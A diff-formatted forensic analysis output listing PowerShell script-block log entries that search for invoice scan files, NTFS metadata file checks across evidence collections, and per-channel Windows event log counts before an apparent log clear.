+EID=4104 EventRecordID=1182 TimeCreated=2026-08-21T16:35:24.292403Z
+ScriptBlockText=Get-ChildItem "Z:\collection_s1" -Recurse -Filter "*invoice_scan" | Select-Object -First FullName
+---
+EID=4104 EventRecordID=1188 TimeCreated=2026-08-21T16:35:41.033947Z
+ScriptBlockText=Get-ChildItem "Z:\collection_s1" -Recurse -Filter "*invoice_scan" | Select-Object FullName
+---
+EID=4104 EventRecordID=1204 TimeCreated=2026-08-21T16:38:39.934342Z
+ScriptBlockText=Get-ChildItem "Z:\collection_s1" -Recurse -Filter "INVOICE_SCAN*" | Select-Object FullName
+---
+SUMMARY 4104_total=1270 4104_pre_clear=1231 invoice_scan_hits=46
+
+===== QUERY: $MFT / $LogFile / $J presence check =====
+collection_clean_a C\$MFT exists=True size=433848320
+collection_clean_a C\$LogFile exists=True size=67108864
+collection_clean_a C\$Extend\$J exists=True size=42109000
+collection_clean_b C\$MFT exists=True size=433848320
+collection_clean_b C\$LogFile exists=True size=67108864
+collection_clean_b C\$Extend\$J exists=True size=42876912
+collection_s1_v2 C\$MFT exists=True size=472907776
+collection_s1_v2 C\$LogFile exists=True size=67108864
+collection_s1_v2 C\$Extend\$J exists=True size=41589712
+
+===== QUERY: 118-channel listing with pre-clear record counts (pre-clear = TimeCreated < 2026-08-23T23:05:06.682356Z) =====
+evtx_files=118
+Application.evtx total=4032 pre_clear=3927 parse_fail=0
+Microsoft-Client-Licensing-Platform%4Admin.evtx total=465 pre_clear=461 parse_fail=0
+Microsoft-Windows-AAD%4Operational.evtx total=12 pre_clear=12 parse_fail=0
+Microsoft-Windows-All-User-Install-Agent%4Admin.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-Application-Experience%4Program-Compatibility-Assistant.evtx total=2 pre_clear=1 parse_fail=0
+Microsoft-Windows-Application-Experience%4Program-Compatibility-Troubleshooter.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-Application-Experience%4Program-Inventory.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-Application-Experience%4Program-Telemetry.evtx total=66 pre_clear=66 parse_fail=0
+Microsoft-Windows-Application-Experience%4Steps-Recorder.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-AppModel-Runtime%4Admin.evtx total=1599 pre_clear=1597 parse_fail=0
+Microsoft-Windows-AppReadiness%4Admin.evtx total=1171 pre_clear=1171 parse_fail=0
+Microsoft-Windows-AppReadiness%4Operational.evtx total=68 pre_clear=68 parse_fail=0
+Microsoft-Windows-AppXDeployment%4Operational.evtx total=2000 pre_clear=1932 parse_fail=0
+Microsoft-Windows-AppXDeploymentServer%4Operational.evtx total=4174 pre_clear=4170 parse_fail=0
+Microsoft-Windows-AppxPackaging%4Operational.evtx total=1916 pre_clear=1832 parse_fail=0
+Microsoft-Windows-Audio%4CaptureMonitor.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-Audio%4Operational.evtx total=16 pre_clear=16 parse_fail=0
+Microsoft-Windows-Audio%4PlaybackManager.evtx total=2 pre_clear=2 parse_fail=0
+Microsoft-Windows-BackgroundTaskInfrastructure%4Operational.evtx total=26 pre_clear=25 parse_fail=0
+Microsoft-Windows-Biometrics%4Operational.evtx total=32 pre_clear=32 parse_fail=0
+Microsoft-Windows-BitLocker%4BitLocker Management.evtx total=6 pre_clear=6 parse_fail=0
+Microsoft-Windows-Bits-Client%4Operational.evtx total=1060 pre_clear=1046 parse_fail=0
+Microsoft-Windows-Cleanmgr%4Diagnostic.evtx total=129 pre_clear=129 parse_fail=0
+Microsoft-Windows-CloudStore%4Operational.evtx total=307 pre_clear=299 parse_fail=0
+Microsoft-Windows-CodeIntegrity%4Operational.evtx total=47 pre_clear=46 parse_fail=0
+Microsoft-Windows-Containers-BindFlt%4Operational.evtx total=23 pre_clear=22 parse_fail=0
+Microsoft-Windows-Containers-Wcifs%4Operational.evtx total=23 pre_clear=22 parse_fail=0
+Microsoft-Windows-Crypto-DPAPI%4Operational.evtx total=172 pre_clear=169 parse_fail=0
+Microsoft-Windows-Crypto-NCrypt%4Operational.evtx total=241 pre_clear=236 parse_fail=0
+Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider%4Admin.evtx total=89 pre_clear=89 parse_fail=0
+Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider%4Operational.evtx total=66 pre_clear=66 parse_fail=0
+Microsoft-Windows-DeviceSetupManager%4Admin.evtx total=1688 pre_clear=1601 parse_fail=0
+Microsoft-Windows-DeviceSetupManager%4Operational.evtx total=14 pre_clear=12 parse_fail=0
+Microsoft-Windows-Dhcp-Client%4Admin.evtx total=13 pre_clear=13 parse_fail=0
+Microsoft-Windows-Diagnosis-DPS%4Operational.evtx total=958 pre_clear=945 parse_fail=0
+Microsoft-Windows-Diagnosis-Scheduled%4Operational.evtx total=14 pre_clear=14 parse_fail=0
+Microsoft-Windows-Diagnosis-Scripted%4Admin.evtx total=3 pre_clear=3 parse_fail=0
+Microsoft-Windows-Diagnosis-Scripted%4Operational.evtx total=15 pre_clear=15 parse_fail=0
+Microsoft-Windows-Diagnostics-Performance%4Operational.evtx total=77 pre_clear=75 parse_fail=0
+Microsoft-Windows-DiskDiagnosticDataCollector%4Operational.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-Fault-Tolerant-Heap%4Operational.evtx total=6 pre_clear=6 parse_fail=0
+Microsoft-Windows-GroupPolicy%4Operational.evtx total=3142 pre_clear=3064 parse_fail=0
+Microsoft-Windows-HelloForBusiness%4Operational.evtx total=217 pre_clear=211 parse_fail=0
+Microsoft-Windows-IKE%4Operational.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-Kernel-Boot%4Operational.evtx total=92 pre_clear=88 parse_fail=0
+Microsoft-Windows-Kernel-EventTracing%4Admin.evtx total=16 pre_clear=16 parse_fail=0
+Microsoft-Windows-Kernel-PnP%4Configuration.evtx total=145 pre_clear=141 parse_fail=0
+Microsoft-Windows-Kernel-PnP%4Driver Watchdog.evtx total=2 pre_clear=2 parse_fail=0
+Microsoft-Windows-Kernel-ShimEngine%4Operational.evtx total=302 pre_clear=289 parse_fail=0
+Microsoft-Windows-Kernel-WHEA%4Operational.evtx total=92 pre_clear=88 parse_fail=0
+Microsoft-Windows-Known Folders API Service.evtx total=220 pre_clear=214 parse_fail=0
+Microsoft-Windows-LanguagePackSetup%4Operational.evtx total=9 pre_clear=9 parse_fail=0
+Microsoft-Windows-LiveId%4Operational.evtx total=600 pre_clear=557 parse_fail=0
+Microsoft-Windows-MUI%4Operational.evtx total=14 pre_clear=14 parse_fail=0
+Microsoft-Windows-NCSI%4Operational.evtx total=79 pre_clear=79 parse_fail=0
+Microsoft-Windows-NetworkProfile%4Operational.evtx total=342 pre_clear=334 parse_fail=0
+Microsoft-Windows-NlaSvc%4Operational.evtx total=8 pre_clear=8 parse_fail=0
+Microsoft-Windows-Ntfs%4Operational.evtx total=425 pre_clear=422 parse_fail=0
+Microsoft-Windows-Ntfs%4WHC.evtx total=23 pre_clear=22 parse_fail=0
+Microsoft-Windows-OneBackup%4Debug.evtx total=31 pre_clear=31 parse_fail=0
+Microsoft-Windows-Partition%4Diagnostic.evtx total=31 pre_clear=30 parse_fail=0
+Microsoft-Windows-PowerShell%4Admin.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-PowerShell%4Operational.evtx total=1512 pre_clear=1470 parse_fail=0
+Microsoft-Windows-Privacy-Auditing%4Operational.evtx total=456 pre_clear=456 parse_fail=0
+Microsoft-Windows-Program-Compatibility-Assistant%4CompatAfterUpgrade.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-Provisioning-Diagnostics-Provider%4Admin.evtx total=227 pre_clear=227 parse_fail=0
+Microsoft-Windows-PushNotification-Platform%4Operational.evtx total=1581 pre_clear=1541 parse_fail=0
+Microsoft-Windows-ReadyBoost%4Operational.evtx total=77 pre_clear=74 parse_fail=0
+Microsoft-Windows-Resource-Exhaustion-Detector%4Operational.evtx total=57 pre_clear=53 parse_fail=0
+Microsoft-Windows-Resource-Exhaustion-Resolver%4Operational.evtx total=23 pre_clear=23 parse_fail=0
+Microsoft-Windows-RestartManager%4Operational.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-Security-LessPrivilegedAppContainer%4Operational.evtx total=10 pre_clear=10 parse_fail=0
+Microsoft-Windows-Security-Mitigations%4KernelMode.evtx total=17 pre_clear=17 parse_fail=0
+Microsoft-Windows-Security-SPP-UX-Notifications%4ActionCenter.evtx total=63 pre_clear=62 parse_fail=0
+Microsoft-Windows-SettingSync%4Debug.evtx total=259 pre_clear=253 parse_fail=0
+Microsoft-Windows-Shell-Core%4AppDefaults.evtx total=813 pre_clear=810 parse_fail=0
+Microsoft-Windows-Shell-Core%4Operational.evtx total=2239 pre_clear=2100 parse_fail=0
+Microsoft-Windows-ShellCommon-StartLayoutPopulation%4Operational.evtx total=560 pre_clear=554 parse_fail=0
+Microsoft-Windows-SmbClient%4Connectivity.evtx total=309 pre_clear=306 parse_fail=0
+Microsoft-Windows-SmbClient%4Security.evtx total=25 pre_clear=24 parse_fail=0
+Microsoft-Windows-SMBServer%4Operational.evtx total=126 pre_clear=122 parse_fail=0
+Microsoft-Windows-StateRepository%4Operational.evtx total=1746 pre_clear=1729 parse_fail=0
+Microsoft-Windows-Storage-ClassPnP%4Operational.evtx total=6 pre_clear=6 parse_fail=0
+Microsoft-Windows-Storage-Storport%4Health.evtx total=288 pre_clear=279 parse_fail=0
+Microsoft-Windows-Storage-Storport%4Operational.evtx total=635 pre_clear=624 parse_fail=0
+Microsoft-Windows-StorageSettings%4Diagnostic.evtx total=13 pre_clear=13 parse_fail=0
+Microsoft-Windows-StorageSpaces-Driver%4Operational.evtx total=26 pre_clear=25 parse_fail=0
+Microsoft-Windows-Store%4Operational.evtx total=27010 pre_clear=26461 parse_fail=0
+Microsoft-Windows-Storsvc%4Diagnostic.evtx total=48 pre_clear=46 parse_fail=0
+Microsoft-Windows-TaskScheduler%4Maintenance.evtx total=185 pre_clear=183 parse_fail=0
+Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx total=212 pre_clear=204 parse_fail=0
+Microsoft-Windows-Time-Service%4Operational.evtx total=341 pre_clear=338 parse_fail=0
+Microsoft-Windows-TWinUI%4Operational.evtx total=3 pre_clear=3 parse_fail=0
+Microsoft-Windows-TZSync%4Operational.evtx total=5 pre_clear=5 parse_fail=0
+Microsoft-Windows-UAC-FileVirtualization%4Operational.evtx total=74 pre_clear=0 parse_fail=0
+Microsoft-Windows-UniversalTelemetryClient%4Operational.evtx total=667 pre_clear=658 parse_fail=0
+Microsoft-Windows-User Device Registration%4Admin.evtx total=30 pre_clear=29 parse_fail=0
+Microsoft-Windows-User Profile Service%4Operational.evtx total=301 pre_clear=286 parse_fail=0
+Microsoft-Windows-UserPnp%4DeviceInstall.evtx total=8 pre_clear=5 parse_fail=0
+Microsoft-Windows-VolumeSnapshot-Driver%4Operational.evtx total=74 pre_clear=70 parse_fail=0
+Microsoft-Windows-VPN%4Operational.evtx total=0 pre_clear=0 parse_fail=0
+Microsoft-Windows-Wcmsvc%4Operational.evtx total=253 pre_clear=242 parse_fail=0
+Microsoft-Windows-WebAuthN%4Operational.evtx total=44 pre_clear=42 parse_fail=0
+Microsoft-Windows-WER-PayloadHealth%4Operational.evtx total=118 pre_clear=113 parse_fail=0
+Microsoft-Windows-WFP%4Operational.evtx total=20 pre_clear=20 parse_fail=0
+Microsoft-Windows-Windows Defender%4Operational.evtx total=1005 pre_clear=977 parse_fail=0
+Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx total=917 pre_clear=914 parse_fail=0
+Microsoft-Windows-Windows Firewall With Advanced Security%4FirewallDiagnostics.evtx total=3 pre_clear=3 parse_fail=0
+Microsoft-Windows-WindowsSystemAssessmentTool%4Operational.evtx total=140 pre_clear=140 parse_fail=0
+Microsoft-Windows-WindowsUpdateClient%4Operational.evtx total=313 pre_clear=313 parse_fail=0
+Microsoft-Windows-WinINet-Config%4ProxyConfigChanged.evtx total=5 pre_clear=5 parse_fail=0
+Microsoft-Windows-Winlogon%4Operational.evtx total=888 pre_clear=834 parse_fail=0
+Microsoft-Windows-WinRM%4Operational.evtx total=252 pre_clear=248 parse_fail=0
+Microsoft-Windows-WMI-Activity%4Operational.evtx total=1286 pre_clear=1275 parse_fail=0
+Security.evtx total=584 pre_clear=1 parse_fail=0
+Setup.evtx total=131 pre_clear=131 parse_fail=0
+System.evtx total=2647 pre_clear=2579 parse_fail=0
+Windows PowerShell.evtx total=726 pre_clear=719 parse_fail=0
+SUMMARY channels=118 with_pre_clear=106 empty=11 file_errors=0
+HIGHLIGHT {'Application.evtx': (4032, 3927, 0), 'System.evtx': (2647, 2579, 0), 'Microsoft-Windows-PowerShell%4Operational.evtx': (1512, 1470, 0), 'Security.evtx': (584, 1, 0)}
